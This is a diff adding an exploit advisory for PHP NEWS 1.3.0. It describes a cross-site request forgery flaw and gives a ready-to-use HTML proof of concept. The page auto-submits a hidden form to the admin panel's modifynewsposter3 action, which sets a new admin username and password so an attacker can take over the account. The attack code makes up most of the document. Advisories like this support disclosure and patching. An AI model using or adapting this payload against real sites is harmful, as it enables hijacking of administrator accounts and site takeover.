@@ -1,0 +1,58 @@
+*=========================================================================================================
+# Exploit Title: PHP NEWS 1.3.0 - Cross-Site Request Forgery (Add Admin)
+# Author: Meryem AKDOĞAN
+# Google Dork: -
+# Date: 16/10/2016
+# Type: webapps
+# Platform : PHP
+# Vendor Homepage: http://newsphp.sourceforge.net
+# Software Link: https://sourceforge.net/projects/newsphp/
+# Version: 1.3.0
+*=========================================================================================================
+
+
+DETAILS
+========================================
+
+PHP NEWS 1.3.0 versions is vulnerable to CSRF attack (No CSRF token in
+place) meaning that if an admin user can be tricked to visit a crafted URL
+created
+by attacker (via spear phishing/social engineering), a form will be
+submitted to (http://sitename/path/index.php) that will change admin
+password.
+
+Once exploited, the attacker can login to the admin panel using the
+username and the password he posted in the form.
+
+
+RISK
+========================================
+
+Attacker can change admin password with this vulnerablity
+
+
+
+TECHNICAL DETAILS & POC
+========================================
+
+<html>
+  <!— CSRF PoC —>
+  <body>
+    <form action="
+http://site_name/phpnews/index.php?action=modifynewsposter3" method="POST">
+      <input type="hidden" name="id" value="7" />
+      <input type="hidden" name="newusername" value="meryem akdogan" />
+      <input type="hidden" name="username" value="meryem" />
+      <input type="hidden" name="password" value="meryem123." />
+      <input type="hidden" name="password2" value="meryem123." />
+      <input type="hidden" name="email" value="b&#64;gmail&#46;com" />
+      <input type="hidden" name="language" value="en&#95;GB" />
+      <input type="submit" value="Submit request" />
+    </form>
+    <script>
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
+
+========================================
